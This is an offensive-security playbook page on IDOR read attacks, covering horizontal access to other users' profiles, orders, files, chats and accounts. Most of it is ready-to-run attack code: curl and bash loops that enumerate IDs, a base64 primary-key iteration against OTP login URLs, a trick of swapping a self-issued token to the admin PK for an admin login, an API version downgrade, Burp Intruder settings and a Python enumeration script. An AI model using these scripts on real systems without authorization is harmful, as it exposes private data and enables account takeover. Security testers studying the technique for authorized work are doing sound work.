# IDOR — Read (Horizontal Privilege Escalation)

## When this applies

- Endpoint references an object by an identifier in the URL, query, or body (`?id=123`, `/user/123`, `/api/document/123`).
- Authorization is missing or only checks "is authenticated" (not "owns this object").
- You want to read another user's data (profile, transcript, document, chat, file).

## Technique

Direct reference to objects without ownership checks. Iterate the identifier (sequential integers, GUIDs, encoded primary keys) to access other users' resources. Real-time / chat / WebSocket rooms often use sequential room IDs.

```
/user/profile?id=123 → ?id=124
/api/document/123
/download/file/456
/order/1001/receipt → /order/1099/receipt
/chat/?rid=6 → /chat/?rid=1          # Read other users' private conversations
```

## Steps

GUIDs — find them through public interfaces:
```
1. Look for blog posts, comments, forum posts
2. Click on usernames to view profiles
3. Extract GUID from URL
4. Use GUID in privileged endpoints
```

Predictable filenames:
```
/download/1.txt, 2.txt, 3.txt
/transcript/session_001.txt
/backup/2025-01-01.zip
```

Smart ID fuzzing (from known IDs):
```bash
# If you see IDs like 1001, 1023, 1047, 1082 — fuzz the range around them
for i in $(seq 1000 1200); do
  RESP=$(curl -s -o /dev/null -w "%{http_code}:%{size_download}" \
    "https://target.com/order/$i/receipt" -H "Cookie: session=...")
  CODE=$(echo $RESP | cut -d: -f1)
  SIZE=$(echo $RESP | cut -d: -f2)
  if [ "$CODE" = "200" ] && [ "$SIZE" -gt 100 ]; then
    echo "[+] Order $i accessible ($SIZE bytes)"
  fi
done
```

User ID enumeration:
```bash
# If your user ID is 1005, fuzz nearby IDs
for i in $(seq 1000 1100); do
  curl -s "https://target.com/api/user/$i" -H "Cookie: session=..." \
    -o /dev/null -w "$i: %{http_code} %{size_download}\n"
done
```

Encoded-PK IDOR (base64 / hex / rot — looks-random-but-isn't):
```
/accounts/login/otp/<b64_pk>/<token>/         # Django/DRF style
/auth/magic/<urlsafe_b64_uid>?sig=...          # Werkzeug itsdangerous style
/qr/<base64_payload>                           # mobile-app onboarding
```
QR-code, magic-login, "click here to log in", and 2FA-bypass URLs frequently embed the user primary key wrapped in base64 / urlsafe-base64 / hex / rot13 — designers assume "encoded = secret". Decode any opaque-looking ID in a URL before assuming it's a token. Decode and iterate small integers / surrounding values:
```bash
# Detect: is the path-component base64 of an integer?
python3 -c "import base64; print(base64.b64decode('Mg==').decode())"   # 'Mg==' → '2'
# Iterate to discover admin (often PK=1 or PK=2):
for i in 1 2 3 4 5 10 100; do
  b64=$(python3 -c "import base64; print(base64.b64encode(b'$i').decode())")
  curl -s -o /dev/null -w "PK=$i b64=$b64 -> %{http_code}\n" \
    "https://target/accounts/login/otp/$b64/<known_token>/"
done
```
Even when the token IS bound to the user, log in once as a low-priv account, capture the OTP URL for *yourself*, then **swap the b64 PK to PK=1** while keeping the token — the backend often validates the token against the PK in the URL (so a self-issued token + admin PK = admin login). Try also: hex-encoded, rot13'd, signed-but-not-encrypted JWTs (`alg:none` swap), and signed-with-static-secret HMAC variants.

API version differential IDOR:
```bash
# Frontend uses v2 (authorized) — try v1 (may be unprotected)
curl -s -b "$COOKIE" -X POST /api/v2/transactions/download -d '{"_id":"TARGET_ID"}'  # 403
curl -s -b "$COOKIE" -X POST /api/v1/transactions/download -d '{"_id":"TARGET_ID"}'  # 200 ← IDOR
```
Discovery: Extract API version maps from JavaScript bundles (webpack chunks, Next.js `_next/static/chunks/`). Look for config objects like `endpointsV1`/`endpointsV2` — they reveal all routes for each version.

User lookup → IDOR chain:
Endpoints like `/api/auth/inquire?username=X` or `/api/users/search?q=X` that return internal IDs (ObjectIds, UUIDs, numeric IDs) enable targeted IDOR. Always check for user lookup/search/autocomplete endpoints that leak IDs needed for other IDOR attacks.

Burp Intruder setup:
```
Position: /api/user/§1§
Payload type: Numbers
From: 1
To: 1000
Step: 1
```

Python automation:
```python
#!/usr/bin/env python3
import requests

TARGET = "https://target.com/api/user/"
SESSION = "your-session-cookie"
START_ID = 1
END_ID = 1000

for user_id in range(START_ID, END_ID + 1):
    url = f"{TARGET}{user_id}"
    headers = {"Cookie": f"session={SESSION}"}

    response = requests.get(url, headers=headers)

    if response.status_code == 200:
        print(f"[+] User {user_id} accessible")
        print(response.text[:200])
        print("-" * 50)
    elif response.status_code == 403:
        print(f"[-] User {user_id} forbidden")
    else:
        print(f"[?] User {user_id} - Status {response.status_code}")
```

Bash one-liner:
```bash
for i in {1..100}; do
  curl -s "https://target.com/download/$i.txt" \
    -H "Cookie: session=abc123" \
    -o "file_$i.txt";
done
```

## Verifying success

- Response body contains another user's data (different name/email/balance/content than your own).
- Response is `200` with size > baseline empty/error response.
- Sensitive fields (API keys, password fields, transcripts) are populated.
- Status code 200 instead of 403/404 when probing other users' IDs.

## Common pitfalls

- 302 redirects may leak data in the body BEFORE the redirect — view in Burp Repeater, don't follow redirect.
- Some endpoints return `200` with empty body for invalid IDs and `200` with data for valid foreign IDs — compare sizes, not just status codes.
- HTML password fields with `type="password"` are visible in source view — don't assume the masking means safety.

## Tools

- Burp Suite (Repeater, Intruder, Comparer)
- ffuf
- curl, httpie
- Browser DevTools
- Burp extensions: Autorize, AuthMatrix, Auth Analyzer, Auto Repeater
